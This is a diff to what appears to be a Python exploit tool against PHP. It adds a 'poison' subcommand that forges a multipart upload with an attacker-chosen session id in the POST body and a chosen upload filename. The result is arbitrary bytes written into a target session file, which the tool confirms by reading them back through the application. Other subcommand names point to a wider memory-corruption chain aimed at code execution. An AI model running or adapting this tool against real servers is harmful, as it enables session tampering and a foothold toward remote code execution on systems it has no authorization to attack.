@@ -1775,6 +1775,66 @@ def cmd_calibrate(args) -> int:
     return 0
 
 
+def cmd_poison(args) -> int:
+    """Plant chosen bytes into a chosen session file (upload-progress logic).
+
+    The ``MULTIPART_EVENT_FORMDATA`` handler copies the session id straight
+    from the POST body without consulting ``session.use_only_cookies``, and
+    ``MULTIPART_EVENT_FILE_START`` then installs it as ``PS(id)``.  The
+    progress data -- which carries the upload filename -- is therefore
+    written to ``sess_<sid>`` of the attacker's choice, and the builder pool
+    keeps it because ``session.upload_progress.cleanup=Off``.
+
+    This is the chain that applies to every version with
+    ``session.upload_progress`` enabled, including PHP <= 7.x where the
+    struct-freeing chain of this repository does not apply (no
+    ``php_session_cancel_decode``).  It is pure HTTP: the planted bytes are
+    read back through the application, which deserializes the session and
+    reflects its contents.  Turning the plant into RCE additionally needs an
+    application gadget or a local file include; core PHP only gives the
+    arbitrary session-file write.
+    """
+    sid = args.sid.encode("latin1")
+    if not sid:
+        print("[!] --sid is required")
+        return 1
+    payload = args.payload.encode("latin1")
+    progress_key = (getattr(args, "progress_key", None) or "pwn").encode("latin1")
+    builder = Target(args.builder)
+    app = Target(args.base + PATHS["app"])
+
+    parts = [
+        # POST-body session id: fixes which file the progress data lands in
+        {"name": PATHS["cookie"], "data": sid},
+        {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": progress_key},
+        # the filename is the byte string planted into that file
+        {"name": "f", "filename": payload, "data": b"x" * 8},
+    ]
+    status, _headers, _body = builder.post_multipart(parts, b"POISON001",
+                                                     timeout=180.0)
+    print(f"[*] plant status={status} sid={sid.decode('latin1')!r} "
+          f"payload={payload[:60]!r}")
+
+    path = session_file(args.version, sid)
+    on_disk = b""
+    if os.path.isfile(path):
+        with open(path, "rb") as handle:
+            on_disk = handle.read()
+        print(f"[*] session file {path} ({len(on_disk)} bytes)")
+
+    # read it back through the application over HTTP
+    _status, _headers, body = app.get(PATHS["app"], cookie=_cookie(sid))
+    planted = payload in body
+    print(f"[*] application reflects the session: "
+          f"{'YES' if planted else 'no'}")
+    if planted:
+        index = body.find(payload)
+        print(f"    ...{body[max(0, index - 40):index + len(payload) + 8]!r}")
+    ok = planted or (payload in on_disk)
+    print(f"[+] plant {'VERIFIED' if ok else 'FAILED'}")
+    return 0 if ok else 1
+
+
 def cmd_chain(args) -> int:
     print(f"[*] chain: build sessions -> producer -> consumer ({args.phase} phase)")
     builder = Target(args.builder)
@@ -1859,7 +1919,7 @@ def main() -> int:
     sub = parser.add_subparsers(dest="cmd", required=True)
     for name in ("lifecycle", "oracle", "build-oom", "build-ref", "producer",
                  "reclaim-probe", "primitive", "endgame", "chain", "patchcheck",
-                 "leak", "no-oracle", "sweep", "calibrate"):
+                 "leak", "no-oracle", "sweep", "calibrate", "poison"):
         subparser = sub.add_parser(name)
         if name == "no-oracle":
             subparser.add_argument(
@@ -1891,6 +1951,13 @@ def main() -> int:
                 "--no-update-profile", dest="update_profile",
                 action="store_false",
                 help="report the geometry without writing the profile")
+        if name == "poison":
+            subparser.add_argument("--sid", required=True,
+                                   help="session id whose file is written")
+            subparser.add_argument("--payload", required=True,
+                                   help="bytes planted as the upload filename")
+            subparser.add_argument("--progress-key", default=None,
+                                   help="PHP_SESSION_UPLOAD_PROGRESS value")
     args = parser.parse_args()
     configure_paths(args)
     if getattr(args, "candidates", None):
@@ -1914,6 +1981,7 @@ def main() -> int:
         "no-oracle": cmd_no_oracle,
         "sweep": cmd_sweep,
         "calibrate": cmd_calibrate,
+        "poison": cmd_poison,
     }
     return dispatch[args.cmd](args)
 
